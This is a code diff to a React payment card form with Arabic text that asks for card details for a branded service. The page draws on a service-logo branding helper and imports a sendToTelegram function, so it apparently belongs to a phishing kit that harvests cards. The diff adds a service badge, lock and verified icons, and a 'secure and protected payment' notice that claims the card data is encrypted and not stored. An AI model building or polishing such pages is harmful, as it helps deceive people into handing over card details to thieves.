@@ -7,9 +7,10 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
+import { Shield, CreditCard, AlertCircle, ArrowLeft, Lock, BadgeCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
+import ServiceBadge from "@/components/ServiceBadge";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
@@ -129,18 +130,45 @@ const PaymentCardForm = () => {
       description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
+      {/* Service Badge */}
+      <div className="flex justify-center mb-4">
+        <ServiceBadge 
+          serviceKey={serviceKey}
+          serviceName={serviceName}
+          size="lg"
+        />
+      </div>
+
       {/* Security Notice */}
       <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+        className="rounded-lg p-3 sm:p-4 mb-6 relative overflow-hidden"
         style={{
           background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          border: `2px solid ${branding.colors.primary}30`
         }}
       >
-        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <p className="text-xs sm:text-sm">
-          بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
-        </p>
+        {/* Background Pattern */}
+        <div 
+          className="absolute inset-0 opacity-5"
+          style={{
+            backgroundImage: `repeating-linear-gradient(45deg, ${branding.colors.primary} 0, ${branding.colors.primary} 1px, transparent 0, transparent 50%)`,
+            backgroundSize: '8px 8px'
+          }}
+        />
+        <div className="flex items-start gap-2 relative z-10">
+          <Lock className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+          <div className="flex-1">
+            <div className="flex items-center gap-2 mb-1">
+              <p className="text-xs sm:text-sm font-bold">
+                دفع آمن ومحمي
+              </p>
+              <BadgeCheck className="w-4 h-4" style={{ color: branding.colors.secondary }} />
+            </div>
+            <p className="text-xs sm:text-sm">
+              بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
+            </p>
+          </div>
+        </div>
       </div>
 
       {/* Visual Card Display */}
